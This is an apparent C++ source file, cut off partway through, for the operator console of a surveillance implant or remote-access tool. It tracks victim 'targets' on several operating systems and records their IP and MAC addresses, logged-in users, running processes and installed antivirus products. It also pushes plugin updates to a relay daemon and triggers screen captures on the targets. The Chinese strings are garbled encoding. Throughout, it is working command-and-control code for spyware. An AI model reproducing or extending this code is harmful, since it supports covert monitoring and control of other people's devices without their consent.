//---------------------------------------------------------------------------

#include "adkprecomp.h"
#include <time.h>
#include "maindlg.h"
#include "Utility.h"
#include "targetdlg.h"
#include "target.h"
#include "controlconnection.h"
#include "targetconnection.h"
#include "DatabaseManager.h"
#include "include/errorcode.h"
#include "include/T5.h"

#include <QString>
#include "adkfile.h"
#include "adkdebug.h"

typedef enum _TARGET_TYPE
{
	WINDOWS_TARGET,
	MACOS_TARGET,
	IOS_TARGET,
	ANDROID_TARGET,
	WINDOWSPHONE_TARGET
} TARGET_TYPE;

std::wstring GetAntiVirusString(ULONG mask)
{
	std::wstring text;

	if ( mask & ANTI_360 )
		text += L"360ɱ�� ";

	if ( mask & ANTI_RISING )
		text += L"���� ";

	if ( mask & ANTI_AVIRA )
		text += L"С��ɡ ";

	if ( mask & ANTI_KAP )
		text += L"����˹�� ";

	if ( mask & ANTI_QQ )
		text += L"QQɱ�� ";

	if ( mask & ANTI_JIANGMIN )
		text += L"���� ";

	if ( mask & ANTI_V3LITE )
		text += L"����ʿ ";

	if ( mask & ANTI_FETS )
		text += L"�Ѷ���˹ ";

	if ( mask & ANTI_MPMON )
		text += L"΢�� ";

	if ( mask & ANTI_NORTON )
		text += L"ŵ�� ";

	if ( mask & ANTI_KINGSOFT )
		text += L"��ɽ��ȫ ";

	if ( mask & ANTI_TREND )
		text += L"���ƿƼ�";

	if ( mask & ANTI_PANDA )
		text += L"��è";

	if ( mask & ANTI_MCAFEE )
		text += L"Mcaffee ";

	if ( mask & ANTI_SKY )
		text += L"������ȫ ";

	if ( mask & ANTI_QUZHUJIAN )
		text += L"���� ";

	if ( mask & ANTI_BITDEFENDER )
		text += L"������� ";

	if ( mask & ANTI_AVG )
		text += L"AVG ";

	if ( mask & ANTI_GDATA )
		text += L"G Data ";

	if ( mask & ANTI_TRUSTPORT )
		text += L"Trust Port ";

	if ( mask & ANTI_COMODO )
		text += L"Comodo ";

	if ( mask & ANTI_BAIDU )
		text += L"�ٶ�ɱ�� ";

	if ( mask & ANTI_ANTIAN )
		text += L"���� ";

	if ( mask & ANTI_AVAST )
		text += L"Avast ";

	if ( mask & ANTI_FSECURE )
		text += L"f-secure ";

	if ( mask & ANTI_NPROTECT )
		text += L"N-Protect ";

	if ( mask & ANTI_SPIDER )
		text += L"��֩�� ";

	if ( mask & ANTI_Sophos )
		text += L"Sophos ";

	return text;
}

//std::map<std::string, CtrCmdHandler>  ControlConnection::c_commandHandlers;
typedef int (ControlConnection::* c_CtrCmdHandler)(std::vector<std::string> &);
static std::map<std::string, c_CtrCmdHandler>  c_commandHandlers;


//---------------------------------------------------------------------------
 
 ControlConnection::ControlConnection(SOCKET sock)
    : Connection(sock), dwCtrUserId(0)
{
    RegisterCommandHandlers();

	for( int j = 0; j < 32; j++ )
	{
		for(int i = 0; i < MAX_PLG_COUNT; i++)
		{
			PlgUptFileTask[j][i] = NULL;
		}
	}
}

//---------------------------------------------------------------------------
void  ControlConnection::RegisterCommandHandlers()
{
    if (c_commandHandlers.size() == 0)
    {
        c_commandHandlers["OUT"] = &ControlConnection::Handle_OUT;
        
        c_commandHandlers["HEL"] = &ControlConnection::Handle_HEL;
        c_commandHandlers["INI"] = &ControlConnection::Handle_INI;
        c_commandHandlers["TAR"] = &ControlConnection::Handle_TAR;
        c_commandHandlers["CIN"] = &ControlConnection::Handle_CIN;
        c_commandHandlers["STA"] = &ControlConnection::Handle_STA;
        c_commandHandlers["LOG"] = &ControlConnection::Handle_LOG;
        c_commandHandlers["TSW"] = &ControlConnection::Handle_TSW;
        
        c_commandHandlers["QNG"] = &ControlConnection::Handle_QNG;
        c_commandHandlers["QDA"] = &ControlConnection::Handle_QDA;

        c_commandHandlers["LIR"] = &ControlConnection::Handle_LIR;
		c_commandHandlers["DIR"] = &ControlConnection::Handle_DIR;
        c_commandHandlers["FDL"] = &ControlConnection::Handle_FDL;

        c_commandHandlers["PLI"] = &ControlConnection::Handle_PLI;
        c_commandHandlers["PLD"] = &ControlConnection::Handle_PLD;
        c_commandHandlers["UPL"] = &ControlConnection::Handle_UPL;
        c_commandHandlers["PLG"] = &ControlConnection::Handle_PLG;

        c_commandHandlers["CRP"] = &ControlConnection::Handle_CRP;
        c_commandHandlers["RUN"] = &ControlConnection::Handle_RUN;
        c_commandHandlers["CIT"] = &ControlConnection::Handle_CIT;
        c_commandHandlers["COT"] = &ControlConnection::Handle_COT;
        c_commandHandlers["CFI"] = &ControlConnection::Handle_CFI;

        c_commandHandlers["ERA"] = &ControlConnection::Handle_ERA;
        c_commandHandlers["SDS"] = &ControlConnection::Handle_SDS;
        c_commandHandlers["SIL"] = &ControlConnection::Handle_SIL;
        
        c_commandHandlers["OSC"] = &ControlConnection::Handle_OSC;
        c_commandHandlers["OSF"] = &ControlConnection::Handle_OSF;
        c_commandHandlers["OSI"] = &ControlConnection::Handle_OSI;

        c_commandHandlers["SSX"] = &ControlConnection::Handle_SSX;
        c_commandHandlers["ESX"] = &ControlConnection::Handle_ESX;

        c_commandHandlers["SCP"] = &ControlConnection::Handle_SCP;

		c_commandHandlers["FMT"] = &ControlConnection::Handle_FMT;
		c_commandHandlers["GPRS"] = &ControlConnection::Handle_GPRS;
		c_commandHandlers["BGS"] = &ControlConnection::Handle_BACKSOUND;
	}
}
//---------------------------------------------------------------------------

void  ControlConnection::ConnectionCompleted()
{
    this->dwCtrUserId = FrmMain->dwCtrUserId;
    SendMessage(FrmMain->Handle, WM_CONTROL_CONNCOMPLETED, (unsigned int)this, NULL);
    
    this->Send_Identity();
    this->Send_HEL();

	// ��ʼ���ļ����
	this->Send_FMT(0, L"", 1, L"");
    
    SetStatusInfoW(STATUS_INFO,  L"���ճ�ʼ������...");
}
//---------------------------------------------------------------------------
void  ControlConnection::ConnectionClosed()
{
    SendMessage(FrmMain->Handle, WM_CONTROL_CONNCLOSED, NULL, NULL);
}
//---------------------------------------------------------------------------

void  ControlConnection::HandleIncomingData()
{
    while (IsWholeLineAvailable())
    {
		std::vector<std::string> args = GetLine();

		//  @@Note: COMMAND Format:
		//
		//  Target_id Plugin_id   CMD     Trid    Param ....
		//      0        1         2       3        4
		//
        //  Target_id:
        //        0   ----   Daemon self
        //        n   ----   Data is from target N
		//  Plugin_id:
		//        0   ----   Base Plugin (Daemon'self)
		//		1 - n ----   External Plugins
		//

        // Directly Get CMD Handler
        //
        if (-1 == DispatchCommand(args))
        {
            return;
		}
	}
}
//---------------------------------------------------------------------------

int   ControlConnection::DispatchCommand(std::vector<std::string> & args)
{
    std::map<std::string, c_CtrCmdHandler>::iterator i = c_commandHandlers.find(args[2]);
    if (i != c_commandHandlers.end())
    {
        return (this->*c_commandHandlers[args[2]])(args);
    }

    return -1;
}

//---------------------------------------------------------------------------
int   ControlConnection::Handle_OUT(std::vector<std::string> & args)
{
    this->CloseConnection();
    SendMessage(FrmMain->Handle, WM_CONTROL_INOTHERPLACE, NULL, NULL);

	return 0;
}
//---------------------------------------------------------------------------
void  ControlConnection::Send_Identity()
{
    // @@NOTE: ����ת������ʹ��ֻʹ��һ���˿�ʱ��ʹ�ø�ָ��������ƶ˺�Ŀ��˵Ĳ�ͬ����
    //
    std::ostringstream buf;
    buf << "0 0 IDE CONT\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
void  ControlConnection::Send_HEL()
{
    // TID PID HEL CtrUserID nDataPortForControl DataLen\r\n LogPass
    //  0   1   2     3           4                  5

    // In HEL Command, TID is only a placeholder
    //    
    std::ostringstream ss;
    ss << "0 0 HEL " << this->dwCtrUserId << " " << FrmMain->nDataPortForControl << " " << 16 << "\r\n";
//    ss << "0 0 HEL " << this->dwCtrUserId << " " << 16 << "\r\n";
	//OutputDebugStringA(ss.str().c_str());
    this->WriteDataCmd(ss.str(), (const char*)FrmMain->byPassMd5, 16);

    // WriteBinaryData �����byPassMd5�е�ֵ�����Լ������������л�ԭ
    //
    CryptData(FrmMain->byPassMd5, 16);
}
//---------------------------------------------------------------------------
// HEL Cmd represents Target Initial processing is finished
//
int  ControlConnection::Handle_HEL(std::vector<std::string> & args)
{
    // TID PID HEL Result
    //  0   1   2   3
    //

    // TargetID is Zero for HEL command
	// PluginID is Zero for HEL command
    
    if (args.size() != 4)
    {
        assert(false);
        return 0;
    }

    int result = atoi(args[3].c_str());
    switch(result)
    {
    case 1:
        Send_INI();
        if (FrmMain->dwCtrUserId != 0)
        {
            Send_FLD();
        }
        break;
    case -1:
        SendMessage(FrmMain->Handle, WM_CONTROL_PASSFAILED, NULL, NULL);
        break;
    case -2: // ���õ��û����ƶ����Ӷ��û���ת������ʱ�����ߵ�����
        SendMessage(FrmMain->Handle, WM_CONTROL_SOLECONNMULTIDAEMON, NULL, NULL);
        break;
    case -3:
        SendMessage(FrmMain->Handle, WM_CONTROL_MULTICONNSOLEDAEMON, NULL, NULL);
        break;
    case -4:
        Send_FLD();
        SendMessage(FrmMain->Handle, WM_CONTROL_MULTIUNSIGNED, NULL, NULL);
        break;
    case -5:
        SendMessage(FrmMain->Handle, WM_CONTROL_DATAPORTINCORRECT, NULL, NULL);        
        break;
    }

    return 0;
}
//---------------------------------------------------------------------------
void  ControlConnection::Send_FLD()
{
    // TID PID INI StartFlagID StopFlagID
    //  0   1   2       3           4
    //

    std::ostringstream ss;
    ss << "0 0 FLD " << FrmMain->dwStartFlagId << " " << FrmMain->dwStopFlagId << "\r\n";
    Write(ss);
}
//---------------------------------------------------------------------------
void  ControlConnection::Send_INI()
{
    // TID PID INI
    //  0   1   2
    
    // In INI Command, TID is only a placeholder
    //
    std::ostringstream ss;
    ss << "0 0 INI\r\n";
    Write(ss);
}

//---------------------------------------------------------------------------
int  ControlConnection::Handle_INI(std::vector<std::string> & args)
{
    // TID PID INI
    //  0   1   2
    //

    // TargetID is Zero for INI command
	// PluginID is Zero for INI command
    //
    
    xASSERT ((args.size() == 3));

    SendMessage(FrmMain->Handle, WM_CONTROL_ONLINE, NULL, NULL);
    Send_PLI(0);        // ��ȡ��ת�ϵĲ����Ϣ
    
    return 0;
}

void  ControlConnection::Send_SDA(ULONG targetId, DWORD value)
{
	// TID PID SDA DATALEN\r\nDATA
	//
	std::ostringstream buf;
	buf << targetId << " 0 SDA " << sizeof(DWORD) << "\r\n";

	this->WriteDataCmd(buf.str(), (const char*)&value, sizeof(DWORD));

}


//---------------------------------------------------------------------------
void  ControlConnection::Send_SDA(PBYTE lpData, DWORD dwDataSize)
{
    // TID PID SDA DATALEN\r\nDATA
    //
    std::ostringstream buf;
    buf << "0 0 SDA " << dwDataSize << "\r\n";

    this->WriteDataCmd(buf.str(), (const char*)lpData, dwDataSize);

}
//---------------------------------------------------------------------------
void  ControlConnection::Send_QDA(ULONG targetId)
{
    // TID PID QDA\r\n
    //

    std::ostringstream buf;
    buf << targetId << " 0 QDA\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
int  ControlConnection::Handle_QDA(std::vector<std::string> & args)
{
    // TID PID QDA DATA DATALEN\r\nDATA
    //  0   1   2   3      4
    //

    //xASSERT((args.size() == 5));

    ULONG targetId = strtoul(args[0].c_str(), NULL, 10);
    
    std::string data;
    int dataLen = atoi(args[4].c_str());
    if (dataLen > 0)
    {
        if (false == IsWholeDataAvailable(dataLen))
        {
            RecoverCommand();
            return -1;
        }
        data = GetData(dataLen);
    }

    Target * tarBlock = GetTargetFromGlobalMap(targetId);
    if (tarBlock == NULL)
    {
        assert(tarBlock);
        return 0;
    }

    PBYTE lpData = (PBYTE)data.c_str();
    SendMessage(FrmMain->Handle, WM_QUERY_DAEMONADDR_FINISHED, (unsigned int)tarBlock, (unsigned int)lpData);

    if (dataLen == 2 * sizeof(DAEMONADDR))
    {
        lpData = lpData + sizeof(DAEMONADDR);  
        SendMessage(FrmMain->Handle, WM_QUERY_DAEMONADDR2_FINISHED, (unsigned int)tarBlock, (unsigned int)lpData);            
    }

    return 0;
}
//---------------------------------------------------------------------------
int  ControlConnection::Handle_TSW(std::vector<std::string> & args)
{
   	// TID PID TSW FLAGID
	//  0   1   2   3
	//
    DWORD   dwTargetID = strtoul(args[0].c_str(), NULL, 10);
    DWORD   dwFlagID   = strtoul(args[3].c_str(), NULL, 10);

    Target * tarBlock = GetTargetFromGlobalMap(dwTargetID);
    if (tarBlock == NULL)
    {
        assert(tarBlock);
        return 0;
    }
    
    tarBlock->dwGroupID = dwFlagID;
    if (dwFlagID < FrmMain->dwStartFlagId || dwFlagID > FrmMain->dwStopFlagId)
    {
        tarBlock->bIsMyTarget = false;
    }
        
    SendMessage(FrmMain->Handle, WM_TARGET_SWITCH, (unsigned int)tarBlock, 0);
        
    return 0;
}
//---------------------------------------------------------------------------
int  ControlConnection::Handle_TAR(std::vector<std::string> & args)
{
	// TargetID PID TAR GroupID  OsBuildNumber CurMAC LocalIP  PublicIP  ProtocolVersion  CurrentNetEnvironment
	//    0      1   2      3            4          5      6       7         8                  9
	//
    // xASSERT((args.size() == 9));

    ULONG       targetID        = strtoul(args[0].c_str(), NULL, 10);
    ULONG       dwFlagID         = strtoul(args[3].c_str(), NULL, 10);

    if (dwFlagID >= 0x7FFFFFFF)
    {
        dwFlagID = 100000;      // �����ֵ����0x7FFFFFFF,��Ĭ������Ϊ10W
    }
    
    ULONG       osBuildNumber   = strtoul(args[4].c_str(), NULL, 10);
    std::string  macAddr         = args[5].c_str();
    ULONG       remLocIpAddr    = strtoul(args[6].c_str(),NULL,10);
    std::string  localIpAddr     = GetIPStrFromInt32(remLocIpAddr);
    std::string  publicIpAddr    = args[7].c_str();


    ULONG       antiVirus = strtoul(args[8].c_str(), NULL, 10);

	if ( antiVirus == 1500 )
		antiVirus = 0;

	ULONG netEnv = 1;

	if ( args.size() > 9 )
		netEnv = strtoul(args[9].c_str(), NULL, 10);

    if (FrmMain->dwCtrUserId != 0)
    {
        // ����ƶ˻����£��յ������Լ���Ŀ�꣬�򲻽��д���
        //
        if ((dwFlagID < FrmMain->dwStartFlagId) || (dwFlagID > FrmMain->dwStopFlagId))
        {
            return 0;
        }
    }

    //  ���ش���
    //

	std::wstring antiVirusString = GetAntiVirusString(antiVirus);

    Target *tar = GetTargetFromGlobalMap(targetID);
    if (NULL == tar)
    {
        tar  = new Target();
        tar->dwProtocolVersion = 0;
        tar->dwTargetID        = targetID;
        tar->dwGroupID         = dwFlagID ;
		QString convert = QString("%1").arg(targetID);
        tar->aniTargetName     = convert.toStdString();
		
        tar->widTargetName     = convert.toStdWString();
        tar->dwOsBuildNumber   = osBuildNumber;
        tar->aniRemMacAddr     = macAddr ;
        tar->aniRemLocalIpAddr = localIpAddr;
        tar->aniRemPublicIpAddr= publicIpAddr;
        tar->bIsMyTarget = true;
		tar->dwLangId = 0;
		tar->m_netEnv = netEnv;
		tar->m_antiVirus = antiVirusString;
        
        SendMessage(FrmMain->Handle, WM_NEW_TARGET, (unsigned int)tar, 1);

        SetStatusInfoExA(STATUS_NOTE, "����һ����Ŀ��(Ŀ��ID:%u,IP��ַ:%s, GroupId:%s)",
                                    targetID, publicIpAddr.c_str(), args[3].c_str());
    }
    else
    {
        tar->bIsMyTarget = true;
            
        if (/*(tar->dwProtocolVersion  != protocolVersion)
        ||*/  (tar->aniRemMacAddr      != macAddr)
        ||  (tar->aniRemLocalIpAddr  != localIpAddr)
        ||  (tar->aniRemPublicIpAddr != publicIpAddr)
        ||  (tar->dwOsBuildNumber    != osBuildNumber)
		|| (tar->m_netEnv != netEnv )
		|| ( tar->m_antiVirus != antiVirusString ))
        {
            tar->aniRemMacAddr      = macAddr;
            tar->aniRemLocalIpAddr  = localIpAddr;
            tar->aniRemPublicIpAddr = publicIpAddr;
            tar->dwOsBuildNumber    = osBuildNumber;
            /*tar->dwProtocolVersion  = protocolVersion;*/
			tar->m_netEnv = netEnv;
			tar->m_antiVirus = antiVirusString;

            SendMessage(FrmMain->Handle, WM_TARGET_INFO_UPDATED, (unsigned int)tar,NULL);
        }
    }

    // Get FileTask, current status, log history
    //
    Send_STA(targetID);         // ��ȡĿ��״̬��Ϣ
    Send_PLI(targetID);         // ��ȡĿ������Ϣ
    Send_LIR(targetID);         // ��ȡ�̷��б�

    if (tar->bConnecting == false && tar->bTarConnOnline == false)
    {
        // ֪ͨ���̣߳���ʼ����Ŀ����������,һ��Ŀ��ֻ����һ����������
        //
        tar->StartTarDataConn();
    }

    return 0;
}

//---------------------------------------------------------------------------
void  ControlConnection::Send_STA(ULONG targetId)
{
    // TID PID STA
	//  0   1   2 
	//
    std::ostringstream buf;
    buf << targetId << " 1 STA\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
int   ControlConnection::Handle_STA(std::vector<std::string> & args)
{
	// TID PID STA ONL(OFF) LastTime
    //  0   1   2   3          4
    //

    if (args.size() != 5)
    {
        assert(false);
        return 0;
    }

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target *tarBlock = GetTargetFromGlobalMap(targetID);
    if (NULL == tarBlock)
    {
        assert(false);
        return 0;
    }

    tarBlock->lastTime = strtoul(args[4].c_str(),NULL,10);
        
    if ("ONL" == args[3])
    {
        tarBlock->tarStatus = TARONLINE;
    }
    else
    {
        tarBlock->tarStatus = TAROFFLINE;
    }
    
    SendMessage(FrmMain->Handle, WM_TARGET_STATUS_CHANGE, (unsigned int)tarBlock, NULL);
    
    return 0;
}
//---------------------------------------------------------------------------
int  ControlConnection::Handle_CIN(std::vector<std::string> & args)
{
	// TID PID CIN  LanguageID ComputerNameBase64 OnlineProcessBase64 LoginUserBase64\r\n  
	//  0   1   2	   3			   4				 5					6
	//

    if (args.size() != 7)
    {
        xASSERT((args.size() == 7));
    }

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target *tarBlock = GetTargetFromGlobalMap(targetID);
    if (NULL == tarBlock)
    {
        assert(false);
        return 0;
    }

    std::string land = args[3].c_str();
    DWORD langId = strtoul(args[3].c_str(), NULL, 10);
    std::string aniComputerName = args[4].c_str();
    std::string aniOnlProcName = args[5].c_str();
    std::string aniLoginUser = args[6].c_str();

    if ((tarBlock->dwLangId != langId)
     || (tarBlock->aniComputerNameBase64 != aniComputerName)
     || (tarBlock->aniOnlineProcBase64   != aniOnlProcName)
     || (tarBlock->aniLoginUserBase64    != aniLoginUser))
    {
        tarBlock->dwLangId = langId;
        tarBlock->aniComputerNameBase64 = aniComputerName;
        tarBlock->aniOnlineProcBase64 = aniOnlProcName;
        tarBlock->aniLoginUserBase64 = aniLoginUser;
        
        SendMessage(FrmMain->Handle, WM_TARGET_EXINFO_UPDATED, (unsigned int)tarBlock,NULL);
    }

    return 0;
}
//---------------------------------------------------------------------------
int   ControlConnection::Handle_LOG(std::vector<std::string> & args)
{
    // TID PID LOG ONL(OFF) LastTime LocalIP PublicIP CurMAC [OnlineProcessBase64 LoginUserBase64]
    //  0   1   2    3         4        5       6       7			8                   9
    //

    xASSERT(((args.size() == 8) || (args.size() == 10)));

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target *tarBlock = GetTargetFromGlobalMap(targetID);
    if (NULL == tarBlock)
    {
        assert(false);
        return 0;
    }

    ULONG  lastTime = strtoul(args[4].c_str(),NULL,10);
    ULONG  locIpAddr = strtoul(args[5].c_str(),NULL,10);
    ULONG  pubIpAddr = strtoul(args[6].c_str(),NULL,10);
    
    std::string localIpAddr  = GetIPStrFromInt32(locIpAddr);
    std::string publicIpAddr = GetIPStrFromInt32(pubIpAddr);

    std::string status = "����";
    const char *lpszOnlProcBase64 = NULL;
    const char *lpszLoginUserBase64 = NULL;
    if (args[3] == "ONL")
    {
        status = "����";
        lpszOnlProcBase64 = args[8].c_str();
        lpszLoginUserBase64 = args[9].c_str();
    }

    std::string timeStr = GetTimeString(lastTime);
    DM->InsertTargetLogInfo(targetID,
                         status.c_str(),
                         timeStr.c_str(),
                         localIpAddr.c_str(),
                         publicIpAddr.c_str(),
                         args[7].c_str(),
                         lpszOnlProcBase64,
                         lpszLoginUserBase64);

	if ( tarBlock->frmTarControl )
	{
		tarBlock->frmTarControl->RefreshOnlineLogInfo();
	}
                         
    return 0;
}
//---------------------------------------------------------------------------
void  ControlConnection::Send_PLI(ULONG targetId)
{
    // TID PID PLI
	//  0   1   2 
	//
    std::ostringstream buf;
    buf << targetId << " 1 PLI\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
void  ControlConnection::StartUptPluginToDaemon(DWORD dwPluginId, DWORD dwNewPlgVer, DWORD dwOsType)
{
    SetStatusInfoExA(STATUS_NOTE, "������ת�������ϵĲ��%u���汾%u", dwPluginId, dwNewPlgVer);

	// TID PID UPL OSTYPE NEWVersion StartPos
	//  0   1   2    3        4         5
	//
	std::ostringstream buf;
	buf << "0 " << dwPluginId << " UPL " << dwOsType << " " << dwNewPlgVer << " 0";

	std::vector<std::string> fakeUplCmd = SplitString(buf.str(), " ");
	this->Handle_UPL(fakeUplCmd);
}
//---------------------------------------------------------------------------
void  ControlConnection::Send_UPL(DWORD       dwPluginId,
                                            DWORD       dwNewPlgVer,
                                            DWORD       dwStartPos,                                            
                                            std::string flag,
                                            PCHAR       lpData,
                                            DWORD       dwDataLen,
											DWORD		dwOsType)
{
	// TID PID UPL OsType NewVersion StartPos DATA DATALEN\r\nFileContent
	//  0   1   2      3        4      5      6       7
	//

	// TID PID UPL OsTType NewVerSion StartPos DATAFIN DATALEN\r\nFileContent
	//  0   1   2      3        4        5      6          7
	//

    std::ostringstream buf;

    buf << "0 " << dwPluginId << " UPL " << dwOsType << " " << dwNewPlgVer

        << " " << dwStartPos << " " << flag << " " << dwDataLen << "\r\n";

    this->WriteDataCmd(buf.str(), lpData, dwDataLen);

}
//---------------------------------------------------------------------------
int  ControlConnection::Handle_UPL(std::vector<std::string> & args)
{
	// TID PID UPL OSTYPE NEWVersion StartPos
	//  0   1   2    3        4         5
	//

    if (args.size() != 6)
    {
        assert(false);
        return 0;
    }

    ULONG targetId  = strtoul(args[0].c_str(), NULL, 10);
    ULONG dwPluginId  = strtoul(args[1].c_str(), NULL, 10);
	ULONG dwOsType = strtoul(args[3].c_str(), NULL, 10);
    ULONG newPlgVer = strtoul(args[4].c_str(), NULL, 10);
    ULONG startPos  = strtoul(args[5].c_str(), NULL, 10);

    xASSERT((targetId == 0));
    
    PFileTask lpFileTask = this->PlgUptFileTask[dwOsType][dwPluginId];
    if (startPos == 0)
    {
        if (lpFileTask == NULL)
        {
			lpFileTask = new FileTask();

			WCHAR wzPath[MAX_PATH] = {0};
			GetModuleFileNameW(0, wzPath, MAX_PATH);
			*AdkGetFileNameW(wzPath) = L'\0';
			WCHAR wzFullName[MAX_PATH] = {0};

			std::wstring sysPrefix;
			switch ( dwOsType )
			{
			case WINDOWS_TARGET:
				sysPrefix = L"WINDOWS";
				break;
			case MACOS_TARGET:
				sysPrefix = L"MACOSX";
				break;
			case IOS_TARGET:
				sysPrefix = L"IOS";
				break;

			case ANDROID_TARGET:
				sysPrefix = L"ANDROID";
				break;
			}
			wsprintf(wzFullName, L"%components\\%s\\%d.dat", wzPath, sysPrefix.c_str(), dwPluginId);

			lpFileTask->ctrPathW = std::wstring(wzFullName);            
            lpFileTask->dwPluginID = dwPluginId;
            this->PlgUptFileTask[dwOsType][dwPluginId] = lpFileTask;
        }
        else
        {
			if (lpFileTask->hFile)
			{
				CloseHandle(lpFileTask->hFile);
			}

			xASSERT((lpFileTask->dwPluginID == dwPluginId));
        }
        
        lpFileTask->hFile = NULL;
        lpFileTask->dwDaemonedLen = 0;
    }

    // Read data from local file
    //
	xASSERT((lpFileTask!=NULL));
    int byteReaded = 0;
    CHAR buf[4096];
    int ret = ReadDataFromLocalFile(lpFileTask, startPos, buf, 4096, &byteReaded);
    if (0 != ret)
    {
        if (ERR_RED_FILE_END == ret)
        {
            Send_UPL(dwPluginId, newPlgVer, startPos, "DATAFIN", buf, byteReaded, dwOsType);

            // �رվ��
            //
            if (lpFileTask->hFile)
            {
                CloseHandle(lpFileTask->hFile);
                lpFileTask->hFile = NULL;
            }

			SetStatusInfoExW(STATUS_INFO, L"�ɹ�����ת�������ϵĲ�� %d ���µ� %d �汾.", dwPluginId, newPlgVer);

            delete lpFileTask;
            this->PlgUptFileTask[dwOsType][dwPluginId] = NULL;
        }
        else
        {
            return 0;        
        }
    }
    else
    {
        Send_UPL(dwPluginId, newPlgVer, startPos, "DATA", buf, byteReaded, dwOsType);
    }

    return 0;
}
//---------------------------------------------------------------------------
int   ControlConnection::Handle_PLI(std::vector<std::string> & args)
{
	// TID PID PLI OSTYPE PID FILENAME VER UPDATEVER LOADTYPE PROC
	//  0   1   2   3      4     5      6	      7     8       9
	//

    if (args.size() != 10)
    {
        assert(false);
        return 0;
    }

    ULONG targetId = strtoul(args[0].c_str(),NULL,10);
    ULONG pluginId = strtoul(args[4].c_str(),NULL,10);

    if (targetId == 0)
    {
        // ����ȫ�ֲ��
        //
        ULONG  dwPluginVer =  atoi(args[6].c_str());

		ULONG dwSysType = atoi(args[3].c_str());

		PPLUGIN_CXT* PlgCxtVect = NULL;

		switch ( dwSysType )
		{
		case WINDOWS_TARGET:
			PlgCxtVect = FrmMain->WindowsPlgCxtVect;
			break;
		case MACOS_TARGET:
			PlgCxtVect = FrmMain->MacPlgCxtVect;
			break;
		case IOS_TARGET:
			PlgCxtVect = FrmMain->IosPlgCxtVect;
			break;
		case ANDROID_TARGET:
			PlgCxtVect = FrmMain->AndroidPlgCxtVect;
			break;
		}
        
        PPLUGIN_CXT pluginCxt = PlgCxtVect[pluginId];
        if (pluginCxt)
        {
            if (pluginCxt->dwPluginVer > dwPluginVer)
            {
                StartUptPluginToDaemon(pluginId, pluginCxt->dwPluginVer, dwSysType);       // ��ʼ��������ת������
            }
        }
/*#ifdef _DEBUG
        else
        {
            xASSERT((FALSE));
        }
#endif // _DEBUG */       
    }
    else
    {
        // ����Ŀ����
        //
        
        Target * tarBlock = GetTargetFromGlobalMap(targetId);
        if (tarBlock == NULL)
        {
            assert(tarBlock);
            return 0;
        }

        PPLUGIN_CXT pluginCxt = tarBlock->pluginVect[pluginId];
        if (NULL == pluginCxt)
        {
            pluginCxt = (PPLUGIN_CXT)malloc(sizeof(PLUGIN_CXT));
            ZeroMemory(pluginCxt, sizeof(PLUGIN_CXT));
            pluginCxt->dwPluginId = pluginId;

            tarBlock->pluginVect[pluginId] = pluginCxt;
        }

        pluginCxt->lpszPluginName = strdup(args[5].c_str());
        pluginCxt->dwPluginVer = atoi(args[6].c_str());
        pluginCxt->dwUpdateVer = atoi(args[7].c_str());
        pluginCxt->dwUpdateType = 0;            // UNUSED
        pluginCxt->dwLoadType = atoi(args[8].c_str());
        pluginCxt->lpszProcList = strdup(args[9].c_str());

        if (DM->TargetPluginIsExisted(targetId, pluginId))
        {
            DM->UpdateTargetPluginInfo(targetId, pluginCxt);
        }
        else
        {
            DM->InsertTargetPluginInfo(targetId, pluginCxt);
        }
    }

    return 0;
}
//---------------------------------------------------------------------------
int  ControlConnection::Handle_PLD(std::vector<std::string> & args)
{
    // TID PID PLD PID DATALEN\r\nDATA
    //  0   1   2   3     4
    //

    xASSERT((args.size() == 5));

    ULONG targetId = strtoul(args[0].c_str(),NULL,10);
    ULONG pluginId = strtoul(args[3].c_str(),NULL,10);

    std::string data;
    int dataLen = atoi(args[4].c_str());
    if (dataLen > 0)
    {
        if (false == IsWholeDataAvailable(dataLen))
        {
            RecoverCommand();
            return -1;
        }
        data = GetData(dataLen);
    }

    Target * tarBlock = GetTargetFromGlobalMap(targetId);
    if (tarBlock == NULL)
    {
        assert(tarBlock);
        return 0;
    }

    tarBlock->pluginVect[pluginId]->dwDataLen = dataLen;

    if (tarBlock->pluginVect[pluginId]->lpbyData)
    {
        free(tarBlock->pluginVect[pluginId]->lpbyData);
    }
    
    if (dataLen > 0)
    {
        tarBlock->pluginVect[pluginId]->lpbyData = (PBYTE)malloc(dataLen);
        CopyMemory(tarBlock->pluginVect[pluginId]->lpbyData, data.c_str(), dataLen);
    }

    return 0;    
}
//---------------------------------------------------------------------------
void  ControlConnection::Send_PLD(ULONG targetId, ULONG pluginId, PBYTE data, ULONG dataLen)
{
    // TID PID PLD PID DATALEN\r\nDATA
    //  0   1   2   3     4
    //

    std::ostringstream buf;
    buf << targetId << " 0 PLD " << pluginId << " " << dataLen << "\r\n";

    this->WriteDataCmd(buf.str(), (const char*)data, dataLen);

}
//---------------------------------------------------------------------------
void  ControlConnection::Send_SCP(ULONG  targetID)
{
    // TID PID SCP
    //
    std::ostringstream buf;
    buf << targetID << " 0 SCP\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
int   ControlConnection::Handle_SCP(std::vector<std::string> & args)
{
    // TID PID SCP OK/ERR
    //
    ULONG targetId = strtoul(args[0].c_str(),NULL,10);

    Target * tarBlock = GetTargetFromGlobalMap(targetId);
    if (tarBlock == NULL)
    {
        assert(tarBlock);
        return 0;
    }

	if ( tarBlock->frmTarControl )
	{
		SendMessage(tarBlock->frmTarControl->Handle, WM_CAPFULLSCREEN_FINISHED, NULL, NULL);
	}
	
	return 1;
}

//---------------------------------------------------------------------------
void  ControlConnection::Send_LIR(ULONG targetId)

{

    // TID PID LIR

    //  0   1   2
    //

    std::ostringstream buf;

    buf << targetId << " 0 LIR\r\n";
    Write(buf);

}

//---------------------------------------------------------------------------

int  ControlConnection::Handle_LIR(std::vector<std::string> & args)
{

	// TID PID LIR DATA DATALEN\r\nDIRINFORMATION

	//  0   1   2    3   4              5
	//


    xASSERT((args.size() == 5));


    std::string data;
	int			dataLen = 0;

	if ("DATA" == args[3])
	{
		dataLen = atoi(args[4].c_str());
        if (false == IsWholeDataAvailable(dataLen))
		{
  			RecoverCommand();
			return -1;
		}
		data = GetData(dataLen);
	}


    ULONG targetID = strtoul(args[0].c_str(), NULL, 10);
